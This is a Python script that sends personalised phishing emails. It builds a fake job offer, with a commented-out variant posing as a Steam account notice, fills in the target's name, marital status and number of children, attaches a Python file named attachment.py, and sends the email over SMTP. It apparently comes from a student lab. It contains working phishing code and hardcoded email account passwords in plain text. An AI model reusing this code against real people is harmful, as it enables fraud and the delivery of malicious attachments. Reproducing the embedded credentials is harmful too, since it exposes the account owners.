import sys
import smtplib
import ssl
import os
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders


fromEmail = "maabadahatkafa@gmail.com"
mailUname = "maabadahatkafa@gmail.com"
mailPwd = "hvopbgmkmiayfese"
smtpHost = "smtp.gmail.com"
smtpPort = 587
htmlFile = "a.html"
attachmentFile = "attachment.py"


def generate_phishing_email(username, mail_service, title, job_title, personal_status, kids):
    # HTML template
    template = """
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <html>
    <head>
        <title>{title}</title>
    </head>
    <body>
        <h1>Hello, {username}!</h1>
        
        <p>Webos recrutment team recieved your details, and we have an exciting offer just for you.
        
        A job offer as a {job_title} 
        it is sutible for {personal_status} pepole (that may have {kids} kid(s)).
        
        you are more than welcome to fill the attached formal application request,
        and we will get back to you as soon as possible.</p>
       
	   
        
        <img src="https://img.haarets.co.il/bs/0000017f-e980-df2c-a1ff-ffd10f370000/ed/43/b5497cad0e3589c507d521968a31/899853599.JPG?precrop=752,437,x35,y0&amp;height=203&amp;width=350" width="309.6" height="180" sizes="(min-width:1280px) 840px, (min-width:1024px) 652px, (min-width:768px) 768px,(min-width:600px) 600px, 100vw" srcset="https://img.haarets.co.il/bs/0000017f-e980-df2c-a1ff-ffd10f370000/ed/43/b5497cad0e3589c507d521968a31/899853599.JPG?precrop=752,437,x35,y0&amp;height=203&amp;width=350 350w,https://img.haarets.co.il/bs/0000017f-e980-df2c-a1ff-ffd10f370000/ed/43/b5497cad0e3589c507d521968a31/899853599.JPG?precrop=752,437,x35,y0&amp;height=262&amp;width=450 450w,https://img.haarets.co.il/bs/0000017f-e980-df2c-a1ff-ffd10f370000/ed/43/b5497cad0e3589c507d521968a31/899853599.JPG?precrop=752,437,x35,y0&amp;height=349&amp;width=600 600w,https://img.haarets.co.il/bs/0000017f-e980-df2c-a1ff-ffd10f370000/ed/43/b5497cad0e3589c507d521968a31/899853599.JPG?precrop=752,437,x35,y0&amp;height=379&amp;width=652 652w,https://img.haarets.co.il/bs/0000017f-e980-df2c-a1ff-ffd10f370000/ed/43/b5497cad0e3589c507d521968a31/899853599.JPG?precrop=752,437,x35,y0&amp;height=447&amp;width=768 768w,https://img.haarets.co.il/bs/0000017f-e980-df2c-a1ff-ffd10f370000/ed/43/b5497cad0e3589c507d521968a31/899853599.JPG?precrop=752,437,x35,y0&amp;height=488&amp;width=840 840w,https://img.haarets.co.il/bs/0000017f-e980-df2c-a1ff-ffd10f370000/ed/43/b5497cad0e3589c507d521968a31/899853599.JPG?precrop=752,437,x35,y0&amp;height=595&amp;width=1024 1024w,https://img.haarets.co.il/bs/0000017f-e980-df2c-a1ff-ffd10f370000/ed/43/b5497cad0e3589c507d521968a31/899853599.JPG?precrop=752,437,x35,y0&amp;height=744&amp;width=1280 1280w,https://img.haarets.co.il/bs/0000017f-e980-df2c-a1ff-ffd10f370000/ed/43/b5497cad0e3589c507d521968a31/899853599.JPG?precrop=752,437,x35,y0&amp;height=826&amp;width=1420 1420w,https://img.haarets.co.il/bs/0000017f-e980-df2c-a1ff-ffd10f370000/ed/43/b5497cad0e3589c507d521968a31/899853599.JPG?precrop=752,437,x35,y0&amp;height=1116&amp;width=1920 1920w" data-test="articleBodyImage">
        
        <p>Best regards,<br> Nadir Hackerman, and all Webos Team</p>
    </body>
    </html>
    """
    
    return template


def create_email_message(array):

    username = sys.argv[1]
    mail_service_name = sys.argv[2]
    title = sys.argv[3]
    job_title = sys.argv[4]
    personal_status = sys.argv[5]
    kids = sys.argv[6]

    mail_receiver_address = username + "@" + mail_service_name

    print("username: ", username)
    print("mail service name: ", mail_service_name)
    print("title: ", title)
    print("job title: ", job_title)
    print("personal status: ", personal_status)
    print("kids: ", kids)
    
    mail_receiver_address = f"{username}@{mail_service_name}"
    
    template = generate_phishing_email(username, mail_service_name, title, job_title, personal_status, kids)
    
    fp = open(htmlFile, "w")
    html = fp.write(template)
    fp.close()

    fr = open(htmlFile, "r")
    html = fr.read()
    html = html.replace("{username}", username)
    html = html.replace("{job_title}", job_title)
    html = html.replace("{personal_status}", personal_status)
    html = html.replace("{kids}", kids)
    fr.close()

    #crate message object
    msg = MIMEMultipart()
    msg["From"] = fromEmail
    msg["To"] = mail_receiver_address
    msg["Subject"] = ("Job Offer for "+job_title)

    msg.attach(MIMEText(html, 'html'))

    #create file attchments
    part = MIMEBase('application','octet-stream')
    part.set_payload(open(attachmentFile, "rb").read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="{0}"'.format(os.path.basename(attachmentFile)))
    msg.attach(part)

    return msg, mail_receiver_address


def send_email(msg, mail_receiver_address):

    s = smtplib.SMTP(smtpHost,smtpPort)
    s.starttls()
    s.login(mailUname,mailPwd)
    msgText = msg.as_string()
    sendErrs = s.sendmail(fromEmail,mail_receiver_address, msgText)
    s.quit()

    if not len(sendErrs.keys()) == 0:
        raise Exception("Erroes occured while sending email", sendErrs)

    print("Mail sent to: " + mail_receiver_address)
    print("execution complete")

if __name__ == "__main__":
    msg, mail_receiver_address = create_email_message(sys.argv)
    send_email(msg, mail_receiver_address)

'''
import sys
import create_attachment
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders

# The mail we send the phishing mail from.
fromEmail = "Maabada_@outlook.co.il"

# The application key for the mail we send the phishing mail from.
application_key = "avowmnjsepifvwhi"

# The smtp server and port of the mail we send the phishing mail from.
smtpHost = "smtp.outlook.com"
smtpPort = 465

# The html file we send in the phishing mail, this will be the scam mail itself.
htmlFile = "scam.html"

# The attachment file we send in the phishing mail.
attachmentFile = "attachment.py"

"""
creates the mail and sends the mail.
"""


def function(array):
    username = sys.argv[1]
    mail_service_name = sys.argv[2]
    title = sys.argv[3]
    job_title = sys.argv[4]
    personal_status = sys.argv[5]
    kids = sys.argv[6]
    mail_receiver_address = username + "@" + mail_service_name

    print("username: ", username)
    print("mail service name: ", mail_service_name)
    print("title: ", title)
    print("job title: ", job_title)
    print("personal status: ", personal_status)
    print("kids: ", kids)

    fp = open(htmlFile, "r")
    html = fp.read()
    html = html.replace("{{user}}", username)
    fp.close()

    message = MIMEMultipart("alternative")

    message["Subject"] = "Important Information about your steam account"
    message["From"] = fromEmail
    message["To"] = mail_receiver_address

    html_message = MIMEText(html, "html")

    with open(attachmentFile, "rb") as file:
        attachment = MIMEBase("text", "x-python")  # Set content type to "text/x-python"
        attachment.set_payload(file.read())
        encoders.encode_base64(attachment)
        attachment.add_header("Content-Disposition", f"attachment; filename={attachmentFile}")
        message.attach(attachment)

    message.attach(html_message)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", smtpPort, context=context) as server:
        server.login(fromEmail, application_key)
        server.sendmail(fromEmail, mail_receiver_address, message.as_string())

    print("Mail sent to: " + mail_receiver_address)


if __name__ == "__main__":
    function(sys.argv)
'''